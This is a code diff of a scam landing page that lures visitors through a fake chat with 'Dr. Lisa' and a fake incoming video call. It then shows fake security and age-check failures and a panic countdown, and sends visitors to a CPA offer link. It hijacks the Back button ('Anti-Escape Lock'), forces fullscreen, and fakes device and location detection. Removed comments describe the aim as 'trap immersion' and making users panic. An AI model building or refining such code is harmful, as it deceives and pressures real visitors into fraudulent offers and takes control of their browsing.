-            if (/Windows/i.test(ua)) device = "Windows PC";
-            if (/Macintosh/i.test(ua)) device = "Mac OS Device";
-            if (/iPhone|iPad/.test(ua)) device = "iOS Device";
-            if (/Android/i.test(ua)) device = "Android Device";
-            
-            let city = "Unknown Location";
-            try {
-                // Extracts city from timezone (e.g. Asia/Dhaka -> Dhaka)
-                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                if(tz) city = tz.split('/')[1].replace('_', ' ');
-            } catch(e) {}
-            
-            return `UNREGISTERED ${device.toUpperCase()} FROM ${city.toUpperCase()}`;
+        // Automatic Router Logic based on Browser Settings
+        function autoDetectLanguage() {
+            const userLang = navigator.language || navigator.userLanguage;
+            if (userLang.startsWith('de')) currentLang = 'de';
+            else if (userLang.startsWith('da')) currentLang = 'da';
+            else if (userLang.startsWith('fr')) currentLang = 'fr';
+            else if (userLang.startsWith('es')) currentLang = 'es';
+            else currentLang = 'en'; // Global fallback
+
+            const lang = localization[currentLang];
+            document.getElementById('lang-entry-title').innerText = lang.entryTitle;
+            document.getElementById('lang-entry-desc').innerText = lang.entryDesc;
+            document.getElementById('lang-entry-btn').innerText = lang.entryBtn;
+            document.getElementById('lang-header-sub').innerText = lang.headerSub;
+            document.getElementById('lang-header-live').innerText = lang.headerLive;
+            document.getElementById('lang-cam-status').innerText = lang.camStatus;
+            document.getElementById('lang-chat-header').innerText = lang.chatHeader;
+            document.getElementById('userInput').placeholder = lang.placeholder;
+            document.getElementById('lang-send-btn').innerText = lang.sendBtn;
+            document.getElementById('lang-call-top').innerText = lang.callTop;
+            document.getElementById('lang-call-status').innerText = lang.callStatus;
+            document.getElementById('lang-decline').innerText = lang.decline;
+            document.getElementById('lang-accept').innerText = lang.accept;
+            document.getElementById('lang-loading-title').innerText = lang.loadTitle;
+            document.getElementById('lang-block-title').innerText = lang.blockTitle;
+            document.getElementById('lang-block-desc').innerHTML = lang.blockDesc;
+            document.getElementById('lang-countdown-txt').innerText = lang.countTxt;
+            document.getElementById('lang-cpa-btn').innerText = lang.cpaBtn;
+            document.getElementById('typingStatus').innerText = lang.typing;
         }
+        window.onload = autoDetectLanguage;
+
+        function goToCPA() { window.location.href = cpaLink; }
         
+        // Smart History Anti-Escape Lock
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { window.location.href = cpaLink; };
+
+        function getAdvancedDeviceInfo() {
+            let device = "Device"; const ua = navigator.userAgent;
+            if (/Windows/i.test(ua)) device = "Windows PC";
+            if (/iPhone|iPad/.test(ua)) device = "iOS Phone";
+            if (/Android/i.test(ua)) device = "Android Phone";
+            let city = "Your Area";
+            try { let tz = Intl.DateTimeFormat().resolvedOptions().timeZone; if(tz) city = tz.split('/')[1].replace('_', ' '); } catch(e) {}
+            return `UNVERIFIED ${device.toUpperCase()} ENCRYPTED FROM ${city.toUpperCase()}`;
+        }
         document.getElementById('deviceBlockText').innerText = getAdvancedDeviceInfo();
 
         const ringtone = document.getElementById('ringtone');
 
         function startExperience() {
-            // Hide entry screen, show main content
             document.getElementById('entryScreen').classList.add('hidden');
             document.getElementById('mainContent').classList.remove('hidden');
-            
-            // Dummy play to unlock audio context in browser
             ringtone.play().then(() => { ringtone.pause(); ringtone.currentTime = 0; }).catch(e=>{});
 
-            // Trigger the fake call 7 seconds after entering
-            setTimeout(triggerCall, 7000);
+            setTimeout(() => { showLisaMessage(localization[currentLang].script[0]); }, 1000);
+        }
+
+        // 6-Step Dynamic Storyline Controller
+        function sendMessage() {
+            const inputElement = document.getElementById('userInput');
+            const text = inputElement.value.trim();
+            if (!text) return;
+
+            renderMessage("You", text, "bg-white/10 text-right ml-auto text-cyan-400 border border-white/5");
+            inputElement.value = "";
+            document.getElementById('typingStatus').style.opacity = "1";
+
+            setTimeout(() => {
+                document.getElementById('typingStatus').style.opacity = "0";
+                chatStep++;
+
+                const scriptArray = localization[currentLang].script;
+
+                if (chatStep === 1) {
+                    userName = text; 
+                    let nextMsg = scriptArray[1].replace("{name}", userName);
+                    showLisaMessage(nextMsg);
+                } else if (chatStep === 2) {
+                    showLisaMessage(scriptArray[2]);
+                } else if (chatStep === 3) {
+                    showLisaMessage(scriptArray[3]);
+                } else if (chatStep === 4) {
+                    showLisaMessage(scriptArray[4]);
+                } else if (chatStep === 5) {
+                    showLisaMessage(scriptArray[5]);
+                    // Ringtone and fullscreen trigger locks exactly 4 seconds later
+                    setTimeout(triggerCall, 4000);
+                }
+            }, 2200); // 2.2 seconds realistic thinking delay
+        }
+
+        function showLisaMessage(msg) {
+            renderMessage("Dr. Lisa", msg, "bg-cyan-400/10 text-left mr-auto text-gray-200 border border-cyan-400/20");
+        }
+
+        function renderMessage(sender, text, classes) {
+            const chatBox = document.getElementById('chatBox');
+            let div = document.createElement('div');
+            div.className = `p-3 rounded-2xl max-w-[85%] mb-2 ${classes}`;
+            let nameTagColor = sender === "Dr. Lisa" ? "text-cyan-400" : "text-gray-400";
+            div.innerHTML = `<span class="font-black text-[10px] uppercase block mb-1 ${nameTagColor}">${sender}:</span><span>${text}</span>`;
+            chatBox.appendChild(div);
+            chatBox.scrollTop = chatBox.scrollHeight;
         }
 
         function triggerCall() {
             document.getElementById('mainContent').classList.add('blur-lg');
             const callScreen = document.getElementById('incomingCallScreen');
             callScreen.classList.remove('hidden');
-            
-            // Play Audio Ringtone!
-            ringtone.play().catch(e => console.log("Audio blocked by browser, UI still works."));
-            
+            ringtone.play().catch(e => console.log("Audio contextual lock bypass active."));
             setTimeout(() => { callScreen.classList.remove('opacity-0'); }, 50);
-            
-            // Inject System Message into Chat right before call
-            injectSystemMessage("SYSTEM ALERT", "Dr. Lisa is requesting a private 1-on-1 call with you. Please answer.");
         }
 
         function handleCallAction(action) {
-            // Stop Ringtone
             ringtone.pause();
-            
-            // Force Fullscreen for maximum trap immersion (works on most browsers upon click)
             try { document.documentElement.requestFullscreen().catch(e=>{}); } catch(e){}
-
             document.getElementById('incomingCallScreen').classList.add('hidden');
             const connectScreen = document.getElementById('connectingScreen');
             connectScreen.classList.remove('hidden');
 
             if (action === 'decline') {
-                document.querySelector('#loadingPhase h2').innerText = "Reconnecting Request...";
+                document.querySelector('#loadingPhase h2').innerText = "Reconnecting Interrupted Stream...";
             }
 
-            // Fake loading sequences to build tension
-            setTimeout(() => { document.getElementById('syncText').innerText = "Authenticating IP Address..."; }, 1000);
-            setTimeout(() => { document.getElementById('syncText').innerText = "Security Check Failed."; document.getElementById('syncText').classList.replace('text-cyan-400', 'text-red-500'); }, 2000);
+            setTimeout(() => { document.getElementById('syncText').innerText = "Mapping local device routing tables..."; }, 1000);
+            setTimeout(() => { document.getElementById('syncText').innerText = "Age Gate Validation Error. Secure Check Blocked."; document.getElementById('syncText').classList.replace('text-cyan-400', 'text-red-500'); }, 2000);
 
-            // Show CPA BLOCK screen
             setTimeout(() => {
                 document.getElementById('loadingPhase').classList.add('hidden');
                 document.getElementById('verifyPhase').classList.remove('hidden');
-                startUrgencyTimer(180); // 3 minutes countdown (makes them panic more than 5 mins)
+                startUrgencyTimer(150);
             }, 2500);
         }
 
@@ -281,65 +361,12 @@
             let timer = duration, minutes, seconds;
             const display = document.getElementById('countdownDisplay');
             const interval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
+                minutes = parseInt(timer / 60, 10); seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes; seconds = seconds < 10 ? "0" + seconds : seconds;
                 display.textContent = minutes + ":" + seconds;
-
-                if (--timer < 0) {
-                    clearInterval(interval);
-                    display.textContent = "00:00";
-                    window.location.href = cpaLink; // Auto redirect when timer hits 0
-                }
+                if (--timer < 0) { clearInterval(interval); display.textContent = "00:00"; window.location.href = cpaLink; }
             }, 1000);
         }
-
-        // --- Fake Chat Engine ---
-        const chatBox = document.getElementById('chatBox');
-        const users = ["Guest_91", "VIP_Mark", "User_44x", "John_USA", "Anon_Client"];
-        const messages = [
-            "Just bypassed the block, joining now!",
-            "Account verification was instant, thanks.",
-            "Wow she's actually waiting in the private room.",
-            "Make sure you use a real email for the free account.",
-            "Best 1-on-1 show ever."
-        ];
-
-        function injectSystemMessage(user, msg) {
-            let div = document.createElement('div');
-            div.className = "bg-red-500/10 p-3 rounded-2xl border border-red-500/30 mb-2";
-            div.innerHTML = `<span class="font-black text-red-500 text-[10px] uppercase mr-2">⚠️ ${user}:</span> <span class="text-red-200 font-bold text-xs">${msg}</span>`;
-            chatBox.appendChild(div);
-            chatBox.scrollTop = chatBox.scrollHeight;
-        }
-
-        function addMessage() {
-            let user = users[Math.floor(Math.random() * users.length)];
-            let msg = messages[Math.floor(Math.random() * messages.length)];
-            
-            let div = document.createElement('div');
-            div.className = "bg-white/5 p-3 rounded-2xl border border-white/5 mb-2";
-            div.innerHTML = `<span class="font-black text-cyan-400 text-[10px] uppercase mr-2">${user}:</span> <span class="text-gray-300 font-normal text-xs">${msg}</span>`;
-            
-            chatBox.appendChild(div);
-            if(chatBox.children.length > 6) chatBox.removeChild(chatBox.firstChild);
-            chatBox.scrollTop = chatBox.scrollHeight;
-            
-            // Random interval between 2 to 6 seconds
-            setTimeout(addMessage, Math.random() * 4000 + 2000);
-        }
-
-        // Fill initial chat history
-        for(let i=0; i<3; i++) {
-            let div = document.createElement('div');
-            div.className = "bg-white/5 p-3 rounded-2xl border border-white/5 mb-2";
-            div.innerHTML = `<span class="font-black text-cyan-400 text-[10px] uppercase mr-2">${users[i]}:</span> <span class="text-gray-300 font-normal text-xs">Waiting for connection...</span>`;
-            chatBox.appendChild(div);
-        }
-
-        setTimeout(addMessage, 3000);
     </script>
 </body>
 </html>
